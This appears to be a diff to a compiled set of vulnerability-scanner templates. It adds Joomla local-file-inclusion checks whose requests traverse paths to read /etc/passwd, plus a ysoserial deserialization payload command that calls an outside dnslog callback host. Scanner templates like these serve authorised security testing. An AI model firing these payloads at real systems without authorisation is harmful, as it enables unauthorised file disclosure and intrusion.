@@ -2089,6 +2089,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1723",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the iNetLanka Contact Us Draw Root Map (com_drawroot) component 1.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component iNetLanka Contact Us Draw Root Map 1.1 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12289",
+          "https://www.cvedetails.com/cve/CVE-2010-1723"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_drawroot&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1875",
       "info": {
         "author": "daffainfo",
@@ -2565,6 +2602,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_perchafieldsattach&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2037",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Percha Downloads Attach (com_perchadownloadsattach) component 1.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Percha Downloads Attach 1.1 - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/34005",
+          "https://www.cvedetails.com/cve/CVE-2010-2037"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,lfi,joomla"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_perchadownloadsattach&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -27682,6 +27756,9 @@
     {
       "id": "CVE-2021-26295",
       "info": {
+        "additional-fields": {
+          "ysoserial-payload": "java -jar ysoserial-master-d367e379d9-1.jar URLDNS http://t53lq9.dnslog.cn | hex"
+        },
         "author": "madrobot",
         "classification": {
           "cve-id": "CVE-2021-26295",
